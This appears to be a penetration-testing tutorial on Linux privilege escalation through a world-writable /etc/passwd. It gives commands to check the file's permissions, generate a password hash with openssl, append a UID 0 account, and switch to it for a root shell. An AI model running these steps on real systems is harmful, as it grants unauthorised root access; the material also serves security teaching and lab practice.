On modern Linux systems, user password hashes are stored in `/etc/shadow`, which is only readable by privileged users. The `/etc/passwd` file, on the other hand, is world-readable and contains user account metadata such as usernames, UIDs, GIDs, and shells.

However, if `/etc/passwd` becomes **world-writable**, it introduces a critical vulnerability. The system still supports legacy behavior where password hashes placed directly in `/etc/passwd` are considered valid for authentication. If an attacker can write to this file, they can inject arbitrary credentials or even create a new root-level account.

---

## Identifying the misconfiguration

The first step is to verify file permissions:

```bash
ls -la /etc/passwd
```

If the output shows write permissions for non-root users:

```text
-rw-rw-rw- 1 root root ...
```

This indicates that any user can modify the file.

---

## Injecting a privileged user

To exploit this, generate a valid password hash and append a new user entry with UID 0 (root privileges).

### Generate password hash

```bash
openssl passwd w00t
```

Example output:

```text
Fdzt.eqJQ4s0g
```

---

### Add malicious entry

Append a new user with UID and GID set to 0:

```bash
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
```

Structure of the entry:

```text
username:password_hash:UID:GID:comment:home:shell
```

Key detail:

- `UID=0` → root privileges
    
- `GID=0` → root group
    

---

## Gaining root access

Switch to the newly created user:

```bash
su root2
```

Enter the password used during hash generation:

```text
w00t
```

Verify privileges:

```bash
id
```

Expected result:

```text
uid=0(root) gid=0(root) groups=0(root)
```
